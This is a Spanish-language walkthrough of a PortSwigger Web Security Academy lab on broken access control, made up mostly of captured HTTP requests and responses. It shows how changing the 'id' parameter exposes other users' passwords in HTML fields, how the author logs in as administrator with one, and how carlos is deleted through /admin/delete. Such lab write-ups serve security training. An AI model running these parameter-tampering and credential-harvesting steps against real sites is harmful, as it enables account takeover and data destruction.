# 🔑 Laboratorio: ID de usuario controlado por parámetro de solicitud con divulgación de contraseña

**Control de acceso**

Los controles de acceso están diseñados para evitar que los usuarios interactúen con datos o funciones para las que no tienen los permisos pertinentes. Debido al obvio impacto en la seguridad, los controles de acceso rotos son errores críticos en sí mismos. A menudo también brindan acceso a más superficie de ataque, lo que podría contener vulnerabilidades adicionales.

```python
// Some code

Laboratorio: ID de usuario controlado por parámetro de solicitud con divulgación de contraseña

Escalada de privilegios horizontal a vertical



LOGIN USUARIO WIENER:


REQUEST:

GET /generate_204 HTTP/1.1
Host: www.gstatic.com
Pragma: no-cache
Cache-Control: no-cache
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close





POST /login HTTP/1.1
Host: 0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Cookie: session=DgJ9MDSd2DpP247JFBh7c9bhyqOkISpV
Content-Length: 68
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Origin: https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
Connection: close

csrf=B1b2z7tZ7YejspPWWFHouQ1flrzVa6vr&username=wiener&password=peter




https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/my-account?id=wiener


ET /my-account?id=wiener HTTP/2
Host: 0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Cookie: session=x5jaTPyuU2efYSuii8FQDpWEjEqKytuf
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9



VEMOS EL VALOR DE LA CONTRASEÑA DE WIENER:



My Account
Your username is: wiener

Email
 

Password
•••••


ANANLIZAMOS EL HTML Y VEMOS EN VALUE EL VALOR TAPADO DE LA CONTRASEÑA:


<input required="" type="password" name="password" value="peter">


PETER



-----


TRATAMOS DE REALIZAR ESCALADA DE PRIVILEGIOS HORIZONTAL A CARLOS:




https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/my-account?id=carlos


REQUEST:





GET /my-account?id=carlos HTTP/2
Host: 0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Cookie: session=x5jaTPyuU2efYSuii8FQDpWEjEqKytuf
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9





RESPONSE SITIO WEb:





My Account
Your username is: carlos

Email
 

Password
••••••••••••••••••••


HTML:



<input required="" type="password" name="password" value="9v7us3mz9i8t6xnukuht">



9v7us3mz9i8t6xnukuht




TRATAMOS DE REALIZAR ESCALADA DE PRIVILEGIOS HORIZONTAL A ADMINISTRATOR:



https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/my-account?id=administrator




REQUEST:




GET /my-account?id=administrator HTTP/2
Host: 0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Cookie: session=x5jaTPyuU2efYSuii8FQDpWEjEqKytuf
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: none
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9





RESPONSE:








HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Cache-Control: no-cache
X-Frame-Options: SAMEORIGIN
Content-Length: 3835

<!DOCTYPE html>
<html>
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labs.css rel=stylesheet>
        <title>User ID controlled by request parameter with password disclosure</title>
    </head>
    <body>
        <script src="/resources/labheader/js/labHeader.js"></script>
        <div id="academyLabHeader">
            <section class='academyLabBanner'>
                <div class=container>
                    <div class=logo></div>
                        <div class=title-container>
                            <h2>User ID controlled by request parameter with password disclosure</h2>
                            <a class=link-back href='https://portswigger.net/web-security/access-control/lab-user-id-controlled-by-request-parameter-with-password-disclosure'>
                                Back&nbsp;to&nbsp;lab&nbsp;description&nbsp;
                                <svg version=1.1 id=Layer_1 xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' x=0px y=0px viewBox='0 0 28 30' enable-background='new 0 0 28 30' xml:space=preserve title=back-arrow>
                                    <g>
                                        <polygon points='1.4,0 0,1.2 12.6,15 0,28.8 1.4,30 15.1,15'></polygon>
                                        <polygon points='14.3,0 12.9,1.2 25.6,15 12.9,28.8 14.3,30 28,15'></polygon>
                                    </g>
                                </svg>
                            </a>
                        </div>
                        <div class='widgetcontainer-lab-status is-notsolved'>
                            <span>LAB</span>
                            <p>Not solved</p>
                            <span class=lab-status-icon></span>
                        </div>
                    </div>
                </div>
            </section>
        </div>
        <div theme="">
            <section class="maincontainer">
                <div class="container is-page">
                    <header class="navigation-header">
                        <section class="top-links">
                            <a href=/>Home</a><p>|</p>
                            <a href="/my-account?id=wiener">My account</a><p>|</p>
                            <a href="/logout">Log out</a><p>|</p>
                        </section>
                    </header>
                    <header class="notification-header">
                    </header>
                    <h1>My Account</h1>
                    <div id=account-content>
                        <p>Your username is: administrator</p>
                        <form class="login-form" name="change-email-form" action="/my-account/change-email" method="POST">
                            <label>Email</label>
                            <input required type="email" name="email" value="">
                            <input required type="hidden" name="csrf" value="s32K3JNdE9lIee0u3Kba4JyXfgmoIcaF">
                            <button class='button' type='submit'> Update email </button>
                        </form>
                        <form class="login-form" action="/my-account/change-password" method="POST">
                            <br/>
                            <label>Password</label>
                            <input required type="hidden" name="csrf" value="s32K3JNdE9lIee0u3Kba4JyXfgmoIcaF">
                            <input required type=password name=password value='8exuhat1rc5m29yfvmei'/>
                            <button class='button' type='submit'> Update password </button>
                        </form>
                    </div>
                </div>
            </section>
            <div class="footer-wrapper">
            </div>
        </div>
    </body>
</html>





CONTRASEÑA:


<input required type=password name=password value='8exuhat1rc5m29yfvmei'/>




LOGUEAMOS COMO ADMINISTRATOR:




POST /login HTTP/2
Host: 0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Cookie: session=z6AEhtURCDIAIHUf0XqMkDRMLsuxXe2t
Content-Length: 90
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
Origin: https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9

csrf=zeNHLWXmGSDKFCvkelj10OoHvEmihej0&username=administrator&password=8exuhat1rc5m29yfvmei







GET /my-account?id=administrator HTTP/2
Host: 0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Cookie: session=ZF7Oy89UDW4mr23l4GmzSiYmHM4B37mq
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Referer: https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/login
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9




NOS LOGUEAMOS Y OPTUVIOMOS EL PANEL DE ADMIN PARA BORRAR A CARLOS:


BORRAR CARLOOS:


GET /admin/delete?username=carlos HTTP/2




GET /admin/delete?username=carlos HTTP/2
Host: 0a4200b50397117e8371af3e000c00c9.web-security-academy.net
Cookie: session=ZF7Oy89UDW4mr23l4GmzSiYmHM4B37mq
Sec-Ch-Ua: "Chromium";v="118", "Google Chrome";v="118", "Not=A?Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "Linux"
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://0a4200b50397117e8371af3e000c00c9.web-security-academy.net/my-account?id=administrator
Accept-Encoding: gzip, deflate, br
Accept-Language: es-419,es;q=0.9
```
